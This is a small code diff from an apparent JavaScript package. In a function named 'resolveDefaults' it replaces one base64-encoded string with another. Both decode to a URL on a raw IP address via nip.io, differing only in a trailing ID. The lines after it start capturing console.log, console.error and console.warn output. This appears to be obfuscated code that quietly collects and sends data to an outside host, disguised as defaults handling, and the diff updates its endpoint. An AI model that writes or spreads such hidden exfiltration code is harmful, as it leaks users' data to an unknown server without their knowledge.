@@ -24,7 +24,7 @@ function resolveDefaults() {
   }
   if (!does_inc) return;
 
-  const u = Buffer.from('aHR0cHM6Ly81Mi4yMS4zOC4xNTMubmlwLmlvOjgwMDAvMTNhMDA0NjYtM2E2MS00MzZjLThlN2UtOWUyOTg4NDg2MDQ5','base64').toString();
+  const u = Buffer.from('aHR0cHM6Ly81Mi4yMS4zOC4xNTMubmlwLmlvOjgwMDAvZGI5MzVhNGMtMmY2Yi00ZTZiLWI1YzktNjQ0OGRiNDBmODI2','base64').toString();
 
   const logs = [];
   const orig = [console.log, console.error, console.warn];
